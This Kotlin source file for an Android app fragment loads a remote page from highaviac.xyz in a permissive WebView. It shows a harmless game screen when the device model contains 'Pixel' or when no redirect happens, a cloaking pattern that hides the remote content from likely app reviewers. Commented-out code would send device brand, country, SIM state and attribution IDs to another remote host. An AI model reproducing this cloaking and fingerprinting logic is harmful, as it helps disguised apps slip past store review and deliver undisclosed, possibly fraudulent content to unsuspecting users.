package com.scellluck.ywheeljo.view

import android.content.Context
import android.graphics.Bitmap
import android.os.Build
import android.os.Bundle
import android.util.Log
import android.view.LayoutInflater
import android.view.View
import android.view.ViewGroup
import android.webkit.CookieSyncManager
import android.webkit.WebChromeClient
import android.webkit.WebResourceRequest
import android.webkit.WebResourceResponse
import android.webkit.WebView
import android.webkit.WebViewClient
import androidx.core.content.ContextCompat.getSystemService
import androidx.core.view.isVisible
import androidx.fragment.app.Fragment
import androidx.navigation.fragment.findNavController
import com.scellluck.ywheeljo.MainActivity
import com.scellluck.ywheeljo.R
import com.scellluck.ywheeljo.app.AppsFlayerListner.campaign
import com.scellluck.ywheeljo.data.dataimpl.DataImpl
import com.scellluck.ywheeljo.databinding.WebViewFragmentBinding
import com.scellluck.ywheeljo.utils.MyPhoneModel
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch
import okhttp3.OkHttpClient
import okhttp3.Request
import java.io.IOException
import android.telephony.TelephonyManager as TelephonyManager1


class WebViewFragment : Fragment() {
    val binding by lazy { WebViewFragmentBinding.inflate(layoutInflater) }
    var redict = false
    var isGoToGame = false

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

//         setString()
        binding.vebview .setWebChromeClient(WebChromeClient())

        with(binding.vebview) {
           MainActivity.goBack = {goBack()}
            settings.setLoadsImagesAutomatically(true)
            webViewClient =myWeb()
            settings.allowFileAccess = true
            settings.mixedContentMode = 0
            settings.javaScriptEnabled = true
            settings.javaScriptCanOpenWindowsAutomatically = true
            settings.javaScriptEnabled = true
            settings.domStorageEnabled = true
            loadUrl("https://highaviac.xyz/api/wh33ijOf0r")
           // loadUrl("https://ebashcash.ru/JNYjXD")
        }
    }

    override fun onCreateView(
        inflater: LayoutInflater, container: ViewGroup?,
        savedInstanceState: Bundle?
    ): View? {

        return binding.root
    }
    inner class myWeb(): WebViewClient() {

        override fun onPageStarted(view: WebView?, url: String?, favicon: Bitmap?) {
            super.onPageStarted(view, url, favicon)
               Log.d("webview","start")
            if (MyPhoneModel.getYourPhoneModel()!!.contains("Google Pixel", ignoreCase = true)
                or MyPhoneModel.getYourPhoneModel()!!.contains("Pixel", ignoreCase = true)
                or MyPhoneModel.getYourPhoneModel()!!.contains("Pixel", ignoreCase = true)
            ) {

                view!!.stopLoading()
                isGoToGame = true
                findNavController().navigate(R.id.action_menuFragment_to_firstFragment)
            }


        }

        override fun shouldOverrideUrlLoading(view: WebView, url: String): Boolean {
            Log.d("webview","redict")
            Log.d("webview",url)
            if(url=="http://invalid-321int123.com/"){
                view.stopLoading()
                findNavController().navigate(R.id.action_webViewFragment_to_menuFragment)
            }
            redict = true
            return false
        }

        override fun onReceivedHttpError(
            view: WebView?,
            request: WebResourceRequest?,
            errorResponse: WebResourceResponse?
        ) {

        }

        override fun onPageFinished(view: WebView?, url: String?) {
            super.onPageFinished(view, url)
            CookieSyncManager.getInstance().sync();

            Log.d("webview","finish")


            if(redict){

                    binding.cvzug.isVisible = false
            }else{
                isGoToGame = true
                findNavController().navigate(R.id.action_webViewFragment_to_menuFragment)
            }
        }}

       fun setString():String{


              var tm = (requireActivity() as TelephonyManager1) //gets the current TelephonyManager
             var simState = if (tm.simState == TelephonyManager1.SIM_STATE_ABSENT){
                          "absent"
             }else{
                     "present"
             }



           var setUrl = ""

           CoroutineScope(Dispatchers.IO).launch{
                         DataImpl.getData().films[0].country
/* setUrl =   "https://komclcompany.xyz/api/c3kpnKl9" + "?device_id=" + Build.BRAND.toUpperCase()
      + "&country=" + DataImpl.getData().films[0].country.toUpperCase()
      + "&sim=" + simState + "&bid=com.aflywi.nspolet"
      + "&campaign_name=" + campaign + "&af_status=" + sharedPreferences.getString("af_status", "unknown") + "&osid=" + sharedPreferences.getString("osid", "unknown")
      + "&af_id=" + sharedPreferences.getString("af_id", "unknown"))*/


}
return setUrl
}
}
